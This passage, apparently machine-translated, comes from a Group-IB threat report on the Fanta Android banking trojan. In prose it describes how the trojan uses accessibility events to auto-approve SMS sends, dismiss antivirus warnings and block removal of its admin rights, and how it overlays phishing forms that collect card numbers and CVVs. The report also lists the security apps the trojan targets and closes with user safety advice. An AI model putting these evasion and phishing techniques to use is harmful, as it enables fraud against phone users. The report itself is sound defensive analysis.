<b>·</b>当使用“在其他应用上绘制”设置打开页面时 <br>  <b>·</b>打开“应用程序”，“还原和重置”，“重置数据”，“重置设置”，“开发人员面板”，“特殊”页面时。 机会”，“可访问性”，“特殊权利” <br>  <b>·</b>事件是否由某些应用程序生成。 <br><br><div class="spoiler">  <b class="spoiler_title">申请清单</b> <div class="spoiler_text"><ul><li> 安卓 </li><li> 精通大师 </li><li> 清洁大师 </li><li> 适用于x86 CPU的Clean Master </li><li> 魅族应用权限管理 </li><li>  MIUI安全 </li><li>  Clean Master-防病毒和清除缓存和垃圾邮件 </li><li> 家长控制系统和GPS：卡巴斯基SafeKids </li><li> 卡巴斯基反病毒软件AppLock和Web安全Beta </li><li> 病毒清除程序，防病毒程序，清除程序（MAX安全） </li><li> 移动防病毒安全PRO </li><li>  Avast防病毒和免费保护2019 </li><li> 移动安全MegaFon </li><li>  Xperia的AVG保护 </li><li> 移动安全 </li><li>  Malwarebytes防病毒和防护 </li><li>  Android 2019的防病毒 </li><li> 安全大师-防病毒，VPN，AppLock，Booster </li><li> 适用于Huawei System Manager平板电脑的AVG防病毒软件 </li><li> 三星辅助功能 </li><li> 三星智能管理器 </li><li> 安全主管 </li><li> 增速器 </li><li>  Web博士 </li><li>  Dr.Web安全空间 </li><li>  Dr.Web移动控制中心 </li><li>  Web安全太空生活博士 </li><li>  Dr.Web移动控制中心 </li><li> 防病毒和移动安全 </li><li> 卡巴斯基安全软件：防病毒和防护 </li><li> 卡巴斯基电池寿命：节电器和助推器 </li><li> 卡巴斯基网络安全解决方案-保护和管理 </li><li>  AVG Antivirus Free 2019-Protection for Android </li><li> 防毒Android </li><li> 诺顿移动安全和防病毒 </li><li> 防病毒，防火墙，VPN，移动安全 </li><li> 移动安全：防病毒，VPN，防盗 </li><li> 适用于Android的防病毒软件 </li></ul><br></div></div></li><li> 如果在向短号码发送SMS消息时需要许可，则Fanta会模仿单击“ <b>记住选择</b>并<b>发送</b> ”复选框。 </li><li> 当您尝试从木马手中夺走管理员权限时，它将锁定手机屏幕。 </li><li> 阻止添加新管理员。 </li><li> 如果反病毒应用程序<b>dr.web</b>检测到威胁，则Fanta会<b>模拟</b>单击“ <b>忽略”</b>按钮。 </li><li> 如果事件是由<b>Samsung Device Care</b>应用程序生成的，则木马程序模仿单击后退按钮和主页按钮。 </li><li> 如果应用程序是从包含大约30种不同Internet服务的列表中启动的，则Fanta会创建带有表单的网络钓鱼窗口，用于输入有关银行卡的信息。 其中：速卖通，预订，Avito，Google Play市场组件，盘道，Drome Auto等。 <br><br><h2> 网络钓鱼形式 </h2><br>  Fanta分析哪些应用程序在受感染的设备上运行。 如果打开了感兴趣的应用程序，该特洛伊木马程序会在所有其他应用程序的顶部显示一个钓鱼窗口，这是一种用于输入有关银行卡信息的表格。 用户必须输入以下数据： <br><ul><li> 卡号 </li><li> 卡有效期 </li><li>  CVV </li><li> 持卡人姓名（并非适用于所有银行） </li></ul><br> 根据正在运行的应用程序，将显示不同的网络钓鱼窗口。 以下将提供其中一些示例： <br><br>  <b>速卖通：</b> <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/v4/v7/hf/v4v7hfcdopdioinlb7b04qsrasg.png"></div><br>  <b>阿维托：</b> <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/aq/rk/2_/aqrk2_l0jzwt0z6imfw2-nlzkaw.png"></div><br>  <b>对于其他一些应用程序，例如</b> Google Play市场，Aviasales，盘岛，Booking和Trivago： <br><div style="text-align:center;"><img src="https://habrastorage.org/webt/nx/kr/cc/nxkrccwgutxdozz4lgbul0rs6r8.png"></div><br><br><h2> 真的如何 <br></h2><br> 幸运的是，收到本文开头描述的SMS消息的人原来是网络安全领域的专家。 因此，真实的，非目录的版本不同于先前所讲的版本：该人收到了一条有趣的SMS，然后将其发送给Group-IB威胁狩猎情报团队。 攻击的结果是本文。 大结局吧？ 但是，并非所有故事的结局都这么好，以至于您的故事看起来不像是亏损的导演版本，在大多数情况下，遵守以下长期描述的规则就足够了： <br><ul><li> 请勿从Google Play以外的任何其他来源为具有Android操作系统的移动设备安装应用程序 </li><li> 安装应用程序时，请特别注意应用程序要求的权限 </li><li> 注意文件扩展名 </li><li> 定期安装Android OS更新 </li><li> 不要访问可疑资源，也不要从那里下载文件 </li><li> 不要跟踪SMS消息中收到的链接。 </li></ul><br><br>  IB集团对网络犯罪一无所知，但却讲述了最有趣的事情。 <br><br> 充满动感的电报频道（https://t.me/Group_IB），涉及信息安全，黑客和网络攻击，黑客主义者和互联网盗版者。 逐步调查轰动性的网络犯罪，使用Group-IB技术进行实际案例调查，当然，还建议如何避免成为Internet的受害者。 <br><br>  YouTube频道<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">在这里</a> <br>  Instagram上的Group-IB Photowire <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">网站www.instagram.com/group_ib</a> <br>  Twitter短消息twitter.com/GroupIB <br><br>  Group-IB是总部位于新加坡的网络中用于检测和预防网络攻击，检测欺诈和保护知识产权的解决方案的领先开发商之一。 </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN466973/">https://habr.com/ru/post/zh-CN466973/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN466955/index.html">简历之谜。 第3部分。揭开秘密的面纱</a></li>
<li><a href="../zh-CN466957/index.html">iPhone 11，新的iPad，TV +，Arcade等。 苹果今天展示了什么</a></li>
<li><a href="../zh-CN466963/index.html">Habrastatistics：Habr如何在没有极客时间的情况下生活</a></li>
<li><a href="../zh-CN466965/index.html">Apple Presentation九月10，2019</a></li>
<li><a href="../zh-CN466967/index.html">如果可以的话，请猜我：在电影上映之前预测其收视率</a></li>
<li><a href="../zh-CN466979/index.html">使用变量重命名文件-Visual Studio代码</a></li>
<li><a href="../zh-CN466983/index.html">为什么没人能击败特斯拉</a></li>
<li><a href="../zh-CN466985/index.html">关于新的C ++标准</a></li>
<li><a href="../zh-CN466987/index.html">非典型的“ ls”或如何招待linuxoids</a></li>
<li><a href="../zh-CN466993/index.html">配置警告下一代插件以与PVS-Studio集成</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>